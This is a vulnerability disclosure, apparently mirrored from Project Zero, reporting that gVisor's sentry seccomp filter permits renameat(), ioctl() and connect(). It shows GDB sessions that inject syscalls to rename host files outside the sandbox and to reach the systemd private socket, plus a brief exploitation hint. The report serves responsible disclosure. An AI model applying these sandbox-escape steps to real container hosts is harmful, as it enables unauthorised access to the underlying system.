@@ -1,0 +1,132 @@
+id: 31016
+date: 09/01/2018
+title: gVisor Sentry Invalid Access Vulnerability
+author: Jann Horn
+cves: 
+
+gVisor sentry can call renameat() 
+
+
+
+
+The seccomp sandbox of the gVisor sentry permits access to the renameat() syscall: <a href="https://github.com/google/gvisor/blob/master/runsc/boot/filter/config.go#L71" title="" class="" rel="nofollow">https://github.com/google/gvisor/blob/master/runsc/boot/filter/config.go#L71</a>
+I've verified that the seccomp filter attached to the sentry process permits renameat():
+
+user@debian:~/seccomp_dump$ ps aux|grep runsc
+[...]
+root      1131  [...] /usr/local/bin/runsc [...]
+root      1136  [...] /usr/local/bin/runsc [...] --file-access=proxy --overlay=false --multi-container=false --network=host --log-packets=false --platform=kvm [...] --bundle /var/run/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/[...] --controller-fd=3 --console=true --io-fds=4 --io-fds=5 --io-fds=6 --io-fds=7
+[...]
+user@debian:~/seccomp_dump$ sudo ./seccomp_dump 1136 simple
+===== filter 0 (296 instructions) =====
+0001 if arch != 0xc000003e: [true +0, false +1] -> ret TRAP
+[...]
+0101       if nr == 0x00000108: [true +1, false +0] -> ret ALLOW (syscalls: renameat)
+0127       ret TRAP
+[...]
+0092       if nr == 0x00000031: [true +1, false +0] -> ret ALLOW (syscalls: bind)
+0127       ret TRAP
+[...]
+006e     if nr <unknown> 0x00000029: [true +0, false +1]
+0075       if nr == 0x0000002a: [true +1, false +0] -> ret ALLOW (syscalls: connect)
+[...]
+000f if nr <unknown> 0x0000000a: [true +0, false +1]
+0033   if nr == 0x00000010: [true +3, false +0] -> ret ALLOW (syscalls: ioctl)
+[...]
+
+and the sentry is not chrooted, so this actually permits renaming files in the host filesystem:
+
+user@debian:~/seccomp_dump$ sudo ls -l /proc/1136/root/
+total 108
+[...]
+dr-xr-xr-x  170 root root     0 Aug 10 22:31 proc
+-rw-r--r--    1 root root    10 Aug 10 22:37 REAL_ROOT
+[...]
+
+I have also verified this by injecting a renameat() syscall into the sentry process with GDB:
+
+(gdb) info registers
+rax            0x108  264
+rbx            0x1084740  17319744
+rcx            0x4574d3  4551891
+rdx            0xffffffffffffff9c  -100
+rsi            0x7ffc7755ce98  140722310598296
+rdi            0xffffffffffffff9c  -100
+rbp            0x7ffc7755dee0  0x7ffc7755dee0
+rsp            0x7ffc7755ce98  0x7ffc7755ce98
+r8             0x0  0
+r9             0x0  0
+r10            0x7ffc7755cea0  140722310598304
+r11            0x286  646
+r12            0xc420040f68  842350727016
+r13            0xff  255
+r14            0xff  255
+r15            0xf  15
+rip            0x4574d1  0x4574d1 <runtime.futex+33>
+eflags         0x286  [ PF SF IF ]
+cs             0x33  51
+ss             0x2b  43
+ds             0x0  0
+es             0x0  0
+fs             0x0  0
+gs             0x0  0
+(gdb) x/s $rsi
+0x7ffc7755ce98:  "/FOOBAR"
+(gdb) x/s $r10
+0x7ffc7755cea0:  "/BARFOO"
+(gdb) x/1i $rip
+=> 0x4574d1 <runtime.futex+33>:  syscall 
+(gdb) stepi
+0x00000000004574d3 in runtime.futex ()
+(gdb) print $rax
+$4 = 0
+
+Afterwards, /FOOBAR had moved to /BARFOO on the host.
+If you wanted to exploit this, you'd probably want to first write a file to disk through gofer, then use this bug to move it to a different location on the backing mount.
+
+
+=============== limited to network passthrough ===============
+If "--network=host" is enabled, the following things also apply - however, the README warns that "--network=host" reduces isolation, so theses issues are probably less likely to actually affect people.
+
+Permitting ioctl() with arbitrary arguments is probably also not a good idea - when "--network=host" is enabled, the sentry runs with full capabilities in the initial user namespace, and a lot of file types have ioctl handlers that have effects beyond the specific file, gated by capable() checks - for example, if an attacker was able to get a file descriptor to any file on an ext4 filesystem, I think EXT4_IOC_RESIZE_FS would permit resizing the ext4 filesystem on which the given file resides (gated by CAP_SYS_RESOURCE).
+
+connect() is also dangerous - you can use connect() to connect to UNIX domain sockets. The sentry runs in its own network namespace, so it can't connect to abstract socket addresses that were created by other parts of the system, but since the sentry has access to the real host's filesystem, it can still use UNIX domain sockets in the filesystem domain and e.g. talk to the systemd control socket. Again, testing with GDB:
+
+(gdb) x/1i $pc-2
+   0x4574d1 <runtime.futex+33>:  syscall 
+(gdb) set $pc=0x4574d1
+(gdb) set $rax=42
+(gdb) set $rax=41
+(gdb) set $rdi = 1
+(gdb) set $rsi = 1
+(gdb) set $rdx = 0
+(gdb) stepi
+0x00000000004574d3 in runtime.futex ()
+(gdb) print $rax
+$1 = 46
+[write "\x01\x00/run/systemd/private" to the stack at 0x7ffcafb992e8]
+(gdb) set $pc=0x4574d1
+(gdb) set $rax=42
+(gdb) set $rdi = 46
+(gdb) set $rsi = 0x7ffcafb992e8
+(gdb) set $rdx = 110
+(gdb) x/2bx 0x7ffcafb992e8
+0x7ffcafb992e8:  0x01  0x00
+(gdb) x/s 0x7ffcafb992e8+2
+0x7ffcafb992ea:  "/run/systemd/private"
+(gdb) x/1i $pc
+=> 0x4574d1 <runtime.futex+33>:  syscall 
+(gdb) stepi
+0x00000000004574d3 in runtime.futex ()
+(gdb) print $rax
+$5 = 0
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse
+or a patch has been made broadly available (whichever is earlier), the bug
+report will become visible to the public.
+
+
+
+Found by: jannh
+
+#  0day.today [2023-03-21]  #
